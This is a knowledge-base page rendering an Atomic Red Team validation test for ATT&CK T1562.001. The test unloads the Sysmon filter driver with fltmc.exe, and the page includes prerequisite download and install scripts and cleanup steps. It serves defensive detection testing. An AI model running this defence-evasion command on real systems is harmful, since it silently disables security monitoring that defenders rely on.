---
atomic_guid: "811b3e76-c41b-430c-ac0d-e2380bfaa164"
title: "Unload Sysmon Filter Driver"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "811b3e76-c41b-430c-ac0d-e2380bfaa164"
  - "Unload Sysmon Filter Driver"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Unload Sysmon Filter Driver

Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution,
run the prereq_command's and it should fail with an error of "sysmon filter must be loaded".

## Metadata

- Atomic GUID: 811b3e76-c41b-430c-ac0d-e2380bfaa164
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Input Arguments

### sysmon_driver

- description: The name of the Sysmon filter driver (this can change from the default)
- type: string
- default: SysmonDrv

## Dependencies

Sysmon must be downloaded

### Prerequisite Check

```powershell
if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr /i Sysmon 2> nul") -or (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe")) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip" "PathToAtomicsFolder\..\ExternalPayloads\Sysmon" -Force
```

sysmon must be Installed

### Prerequisite Check

```powershell
if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```powershell
if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else
{ & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i}
```

sysmon filter must be loaded

### Prerequisite Check

```powershell
if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```powershell
if(Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"){
  & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -u
  & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i
}else{
  sysmon -u
  sysmon -accepteula -i
}
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
fltmc.exe unload #{sysmon_driver}
```

### Cleanup

```cmd
sysmon -u -i > nul 2>&1
sysmon -i -accepteula -i > nul 2>&1
"PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -u > nul 2>&1
"PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i > nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
